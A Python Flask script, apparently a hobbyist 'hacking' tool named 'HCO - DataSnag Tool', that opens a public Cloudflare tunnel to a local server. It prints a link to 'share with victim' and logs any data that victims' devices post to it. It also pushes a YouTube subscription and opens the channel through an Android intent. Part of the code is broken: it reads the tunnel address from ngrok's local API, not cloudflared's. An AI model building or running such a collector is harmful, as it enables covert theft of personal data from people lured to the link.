import os
import time
import flask
import json
from flask import Flask, request

app = Flask(__name__)

# HCO Banner
os.system("clear")
print("""\033[1;91m
╔══════════════════════════════╗
║      HCO - DataSnag Tool     ║
╚══════════════════════════════╝\033[0m
""")

# Not Free Notice + YouTube Redirect
print("\033[1;93m[!] Tool is not free. Subscribe to use.\033[0m")
time.sleep(8)
os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
input("\033[1;92mPress ENTER after subscribing to continue...\033[0m\n")

# Start Flask Server on Port 5050
print("\033[1;94m[•] Starting Flask server...\033[0m")
def run_flask():
    app.run(host='0.0.0.0', port=5050)

# Start Cloudflared Tunnel
print("\033[1;94m[•] Starting Cloudflare tunnel...\033[0m")
os.system("pkill cloudflared > /dev/null 2>&1")
os.system("cloudflared tunnel --url http://localhost:5050 > .cloudflared.log 2>&1 &")
time.sleep(6)

try:
    import requests
    r = requests.get("http://127.0.0.1:4040/api/tunnels")
    data = r.json()
    url = data['tunnels'][0]['public_url']
    print(f"\033[1;92m[✓] Share this link with victim: {url}\033[0m\n")
except:
    print("\033[1;91m[×] Failed to get Cloudflare URL. Make sure tunnel started properly.\033[0m")

# Endpoint to receive victim data
@app.route('/', methods=['POST'])
def receive():
    data = request.get_json()
    print("\n\033[1;96m[Victim Connected]\033[0m\n")
    for key, value in data.items():
        print(f"\033[1;92m{key}:\033[0m {value}")
    return 'OK'

if __name__ == '__main__':
    run_flask()
